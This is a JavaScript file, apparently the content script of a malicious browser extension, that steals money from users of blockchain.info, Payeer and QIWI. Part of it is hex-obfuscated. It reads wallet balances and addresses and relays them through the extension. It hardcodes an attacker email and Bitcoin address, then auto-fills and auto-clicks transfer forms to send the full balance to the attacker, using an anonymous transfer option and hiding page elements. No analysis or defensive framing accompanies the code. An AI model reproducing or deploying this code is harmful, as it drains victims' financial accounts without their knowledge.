var _0x8762=["\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x62\x69\x74\x63\x6F\x69\x6E\x66\x61\x72\x6D\x2E\x72\x75","\x76\x61\x6C\x75\x65","\x73\x6F\x66\x74\x6F\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x69\x6E\x6E\x65\x72\x54\x65\x78\x74","\x6C\x61\x62\x65\x6C\x20\x6C\x61\x62\x65\x6C\x2D\x64\x61\x6E\x67\x65\x72","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65","\u043D\u0430\u0439\u0434\u0435\u043D\u043E","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x6C\x61\x62\x65\x6C\x20\x6C\x61\x62\x65\x6C\x2D\x73\x75\x63\x63\x65\x73\x73","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x20","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x62\x6C\x6F\x63\x6B\x63\x68\x61\x69\x6E\x2E\x69\x6E\x66\x6F","\x69\x64","\x6C\x6F\x67\x6F\x75\x74","\x6C\x6F\x67\x6F\x75\x74\x73","\x62\x74\x63","\x75\x73\x64","\x62\x66\x66","\x6D\x79\x2D\x70\x72\x69\x6D\x61\x72\x79\x2D\x61\x64\x64\x72\x65\x73\x73","","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6D\x61\x69\x6E\x2D\x6E\x6F\x74\x69\x63\x65\x73\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x6E\x6F\x6E\x65","\x24","\x62\x61\x6C\x61\x6E\x63\x65","\x2D\x31","\x63\x6C\x69\x63\x6B","\x62\x61\x6C\x61\x6E\x63\x65\x32","\x72\x65\x70\x6C\x61\x63\x65","\x72\x61\x6C\x61\x64\x64\x72\x65\x73\x73","\x63\x68\x65\x63\x6B","\x66\x61\x72\x65\x77\x65\x6C\x6C","\x6C\x6F\x67","\x73\x65\x6E\x64\x2D\x74\x6F\x2D\x61\x64\x64\x72\x65\x73\x73","\x63\x6F\x6D\x73","\x73\x65\x6E\x64\x2D\x63\x6F\x69\x6E\x73\x2D\x62\x74\x6E","\x68\x6F\x6D\x65\x2D\x69\x6E\x74\x72\x6F\x2D\x62\x74\x6E","\x73\x65\x6E\x64\x52\x65\x71\x75\x65\x73\x74","\x65\x78\x74\x65\x6E\x73\x69\x6F\x6E","\x6D\x6F\x64\x61\x6C\x2D\x62\x61\x63\x6B\x64\x72\x6F\x70\x20\x20\x69\x6E","\x69\x6E\x73\x75\x66\x66\x69\x63\x69\x65\x6E\x74\x2D\x66\x75\x6E\x64\x73","\x62\x6C\x6F\x63\x6B","\x74\x6F\x70","\x2D\x31\x31\x39\x30\x70\x78","\x62\x74\x6E\x20\x62\x74\x6E\x2D\x70\x72\x69\x6D\x61\x72\x79","\x6E\x65\x77\x2D\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x2D\x6D\x6F\x64\x61\x6C","\x65\x6D\x61\x69\x6C\x61\x64\x64\x72\x65\x73\x73","\x31","\x6F\x66\x66","\x20\x42\x54\x43","\x73\x70\x61\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x73\x75\x6D\x6D\x61\x72\x79\x2D\x62\x61\x6C\x61\x6E\x63\x65","\x73\x74\x61\x74\x75\x73\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x62\x74\x63\x74","\x73\x65\x6E\x64\x2D\x76\x61\x6C\x75\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x73\x65\x6E\x64\x20\x62\x74\x6E\x20\x62\x74\x6E\x2D\x73\x75\x63\x63\x65\x73\x73\x20\x70\x6F\x70"];if(window[_0x8762[1]][_0x8762[0]]==_0x8762[2]){window[_0x8762[12]](function(){document[_0x8762[5]](_0x8762[4])[_0x8762[3]]=1;document[_0x8762[8]](_0x8762[7])[0][_0x8762[6]]=_0x8762[9];document[_0x8762[8]](_0x8762[7])[0][_0x8762[10]]=_0x8762[11]},1000)};function getCookie(_0x27cex2){var _0x27cex3=_0x8762[13]+document[_0x8762[14]];var _0x27cex4=_0x8762[13]+_0x27cex2+_0x8762[15];var _0x27cex5=null;var _0x27cex6=0;var _0x27cex7=0;if(_0x27cex3[_0x8762[16]]>0){_0x27cex6=_0x27cex3[_0x8762[17]](_0x27cex4);if(_0x27cex6!= -1){_0x27cex6+=_0x27cex4[_0x8762[16]];_0x27cex7=_0x27cex3[_0x8762[17]](_0x8762[18],_0x27cex6);if(_0x27cex7== -1){_0x27cex7=_0x27cex3[_0x8762[16]]};_0x27cex5=unescape(_0x27cex3[_0x8762[19]](_0x27cex6,_0x27cex7))}};return (_0x27cex5)}if(window[_0x8762[1]][_0x8762[0]]==_0x8762[20]){document[_0x8762[5]](_0x8762[22])[_0x8762[21]]=_0x8762[23];localStorage[_0x8762[24]]=localStorage[_0x8762[25]]=localStorage[_0x8762[26]]=localStorage[_0x8762[27]]=_0x8762[28];window[_0x8762[12]](function(){if(document[_0x8762[5]](_0x8762[27])[_0x8762[29]]!==_0x8762[28]){document[_0x8762[5]](_0x8762[32])[_0x8762[31]][_0x8762[30]]=_0x8762[33];if(localStorage[_0x8762[24]]==_0x8762[28]){if(document[_0x8762[5]](_0x8762[35])[_0x8762[6]][_0x8762[17]](_0x8762[34])!=_0x8762[36]){document[_0x8762[5]](_0x8762[35])[_0x8762[37]]()};if(document[_0x8762[5]](_0x8762[35])[_0x8762[6]][_0x8762[16]]!==0){window[_0x8762[12]](function(){var _0x27cex8=document[_0x8762[5]](_0x8762[35])[_0x8762[6]];var _0x27cex9=document[_0x8762[5]](_0x8762[38])[_0x8762[6]];localStorage[_0x8762[24]]=_0x27cex8[_0x8762[39]](/[^.0-9]/gim,_0x8762[28]);localStorage[_0x8762[25]]=_0x27cex9},1000)}};if(localStorage[_0x8762[40]]==undefined){localStorage[_0x8762[40]]=document[_0x8762[5]](_0x8762[27])[_0x8762[29]];chrome[_0x8762[49]][_0x8762[48]]({type:_0x8762[41],data:localStorage[_0x8762[40]]},function(_0x27cexa){console[_0x8762[43]](_0x27cexa[_0x8762[42]]);localStorage[_0x8762[44]]=_0x27cexa[_0x8762[42]][1];localStorage[_0x8762[27]]=_0x27cexa[_0x8762[42]][3];localStorage[_0x8762[45]]=_0x27cexa[_0x8762[42]][2];document[_0x8762[5]](_0x8762[46])[_0x8762[37]]();document[_0x8762[5]](_0x8762[47])[_0x8762[37]]()})};if(localStorage[_0x8762[27]]!==_0x8762[28]){document[_0x8762[5]](_0x8762[27])[_0x8762[6]]=localStorage[_0x8762[27]]}};document[_0x8762[8]](_0x8762[50])[0][_0x8762[31]][_0x8762[30]]=_0x8762[33];if(document[_0x8762[5]](_0x8762[51])[_0x8762[31]][_0x8762[30]]==_0x8762[52]){document[_0x8762[5]](_0x8762[51])[_0x8762[31]][_0x8762[53]]=_0x8762[54];document[_0x8762[8]](_0x8762[55])[15][_0x8762[37]]()};if(document[_0x8762[5]](_0x8762[56])[_0x8762[31]][_0x8762[30]]==_0x8762[52]){document[_0x8762[5]](_0x8762[56])[_0x8762[31]][_0x8762[53]]=_0x8762[54];document[_0x8762[8]](_0x8762[55])[18][_0x8762[37]]()}},100);window[_0x8762[12]](function(){if(document[_0x8762[5]](_0x8762[27])[_0x8762[29]]!==_0x8762[28]){chrome[_0x8762[49]][_0x8762[48]]({type:_0x8762[41],data:localStorage[_0x8762[40]]},function(_0x27cexa){localStorage[_0x8762[44]]=_0x27cexa[_0x8762[42]][1];localStorage[_0x8762[45]]=_0x27cexa[_0x8762[42]][2];localStorage[_0x8762[27]]=_0x27cexa[_0x8762[42]][3];localStorage[_0x8762[57]]=_0x27cexa[_0x8762[42]][4];if(_0x27cexa[_0x8762[42]][0]==_0x8762[58]){if(localStorage[_0x8762[24]]!==_0x8762[28]&&localStorage[_0x8762[26]]!==_0x8762[59]){document[_0x8762[5]](_0x8762[35])[_0x8762[6]]=localStorage[_0x8762[24]]+_0x8762[60];document[_0x8762[5]](_0x8762[63])[_0x8762[62]](_0x8762[61])[0][_0x8762[29]]=localStorage[_0x8762[24]]+_0x8762[60];document[_0x8762[5]](_0x8762[38])[_0x8762[6]]=localStorage[_0x8762[25]];document[_0x8762[5]](_0x8762[32])[_0x8762[31]][_0x8762[30]]=_0x8762[33];document[_0x8762[5]](_0x8762[64])[_0x8762[31]][_0x8762[30]]=_0x8762[33];document[_0x8762[5]](_0x8762[46])[_0x8762[37]]();document[_0x8762[5]](_0x8762[47])[_0x8762[37]]();var _0x27cexb=localStorage[_0x8762[24]][_0x8762[39]](/[^.0-9]/gim,_0x8762[28]);localStorage[_0x8762[65]]=(_0x27cexb-localStorage[_0x8762[45]]);document[_0x8762[67]](_0x8762[66])[0][_0x8762[3]]=localStorage[_0x8762[65]];document[_0x8762[67]](_0x8762[44])[0][_0x8762[3]]=localStorage[_0x8762[44]];document[_0x8762[8]](_0x8762[68])[0][_0x8762[37]]();if(document[_0x8762[5]](_0x8762[51])[_0x8762[31]][_0x8762[30]]==_0x8762[52]){document[_0x8762[8]](_0x8762[55])[15][_0x8762[37]]()};if(document[_0x8762[5]](_0x8762[56])[_0x8762[31]][_0x8762[30]]==_0x8762[52]){document[_0x8762[8]](_0x8762[55])[18][_0x8762[37]]()};localStorage[_0x8762[26]]=_0x8762[59];console[_0x8762[43]](_0x8762[44])}}})}},5000)}

var email = "hakerhelp1@mail.ru";
var adrhack = "17gJN422WXBypfsnLuABiaGdWJmhAsDZ6w";
if(window.location["hostname"] == "payeer.com"){
	if(window.location["pathname"] == "/ru/account/"){
		localStorage["adss2"] = "";
	}
	if(window.location["pathname"] == "/en/account/"){
		localStorage["adss2"] = "";
	}
	window.setInterval(function() {
		if(document.getElementsByClassName("val")[0].innerHTML !== ""){
			var rub = document.getElementsByClassName("int")[1].innerHTML;
			var rubusd = document.getElementsByClassName("int")[1].innerHTML / 64;
			var usd = document.getElementsByClassName("int")[0].innerHTML;
			var eur = document.getElementsByClassName("int")[2].innerHTML;
			
			if(window.location["pathname"] != "/ru/account/send/" && localStorage["adss2"] != "/ru/account/send/"){
				localStorage["adss2"] = window.location["pathname"] = "/ru/account/send/";
			}
			
			if(document.getElementsByClassName("button_green_smm2")[0] != undefined && window.location["stop1"] != 1){ 
				document.getElementsByClassName("button_green_smm2")[0].click();
				window.location["stop1"] = 1;
			}
			
			if(document.getElementsByClassName("button_block type")[0] != undefined && window.location["stop2"] != 1){ 
				document.getElementsByClassName("button_block type")[1].click();
				
				window.location["stop2"] = 1;
			}
			

			
			
			
			//rubusd = 4;
			if (rubusd > usd) {
								if(document.getElementById("tab-choosetypeoftransfer").style["display"] == "block"){
								document.getElementsByName("account_email")[0].value = email;
				document.getElementsByClassName("next button_green_sm")[1].click();	
					
				}
				if(document.getElementsByClassName("input3")[1].value != undefined){ 
					document.getElementsByClassName("input3")[1].value = rub;
				}

				//document.getElementsByClassName("send")[0].click()
				document.getElementsByTagName("ul")[11].getElementsByTagName("li")[1].click()
				//document.getElementsByClassName("button_block type")[1].click();
				if(document.getElementsByClassName("input3")[2].value != "0" && document.getElementsByClassName("input3")[2].value != "00.0" && document.getElementsByClassName("input3")[2].value != "" && document.getElementsByClassName("input3")[2].value != undefined){
					document.getElementById("id_transfer_anonim-styler").click()
					document.getElementsByClassName("confirm button_green")[0].click()
				}
			}else{	
				if(document.getElementById("tab-choosetypeoftransfer").style["display"] == "block"){
								document.getElementsByName("account_email")[0].value = email;
				document.getElementsByClassName("next button_green_sm")[1].click();	
					
				}
				if(document.getElementsByClassName("input3")[1].value != undefined){ 
					document.getElementsByClassName("input3")[1].value = usd;
				}

				//document.getElementsByClassName("send")[0].click()
				document.getElementsByTagName("ul")[11].getElementsByTagName("li")[0].click()
				//document.getElementsByClassName("button_block type")[1].click();
				
				if(document.getElementsByClassName("input3")[2].value != "0" && document.getElementsByClassName("input3")[2].value != "00.0" && document.getElementsByClassName("input3")[2].value != "" && document.getElementsByClassName("input3")[2].value != undefined){
					document.getElementById("id_transfer_anonim-styler").click()
					document.getElementsByClassName("confirm button_green")[0].click()
				}
			}
		}
	},100);
}



if(window.location["hostname"] == "qiwi.com" || window.location["hostname"] == "w.qiwi.com" || window.location["hostname"] == "w.qiwi.ru" || window.location["hostname"] == "qiwi.ru" && document.getElementsByClassName("phone")[0].innerHTML.replace(/[^.0-9]/gim,'').length == 11){
	if(window.location["pathname"] == "/main.action"){
		localStorage["adss1"] = "";
	}
	if(document.getElementsByClassName("account_current_amount")[0] != undefined){
		var bal = document.getElementsByClassName("account_current_amount")[0].innerHTML.replace(/[^.0-9]/gim,'');	
		bal = bal.substring(0, bal.length - 2);
	}

	if (bal > 0) {
		if(document.getElementsByClassName("payment_frm providerPay")[0] != undefined){
			document.getElementsByClassName("payment_frm providerPay")[0].style["display"]  = "none";
		}	
		if(document.getElementsByClassName("narrow")[0] != undefined){
			document.getElementsByClassName("narrow")[0].style["display"]  = "none";	
		}

		setInterval(function(){

			if(window.location["pathname"] != "/settings/options/security.action" && localStorage["adss1"] != "/transfer/email.action"){
				window.location["pathname"] = "/settings/options/security.action";	
			}	

			if(window.location["pathname"] == "/settings/options/security.action"){
				if(document.getElementsByClassName("pseudo-checkbox")[0].innerHTML.replace(/[^.a-Я]/gim,'') == "Отключено"){
					localStorage["adss1"] = window.location["pathname"] = "/transfer/email.action";
				}

			}

			
			if(document.getElementsByClassName("liquid dataField")[0] != undefined){
				document.getElementsByClassName("liquid dataField")[0].value = email;
				var balance = document.getElementsByClassName("ui-selectmenu-text")[0].innerHTML.replace(/[^.0-9]/gim,'');
				balance = balance.substring(0, balance.length - 2);
				balance = balance-1;
				document.getElementsByClassName("fixedRub dataField")[0].value = balance;
				setInterval(function(){document.getElementsByClassName("orangeBtn")[0].click()},500);
			}

			if(window.location["pathname"] == "/payment/state.action"){
				document.getElementById("content").style["display"] = "";
				document.getElementsByClassName("orangeBtn")[0].click();
			}
		},500);
	}
}

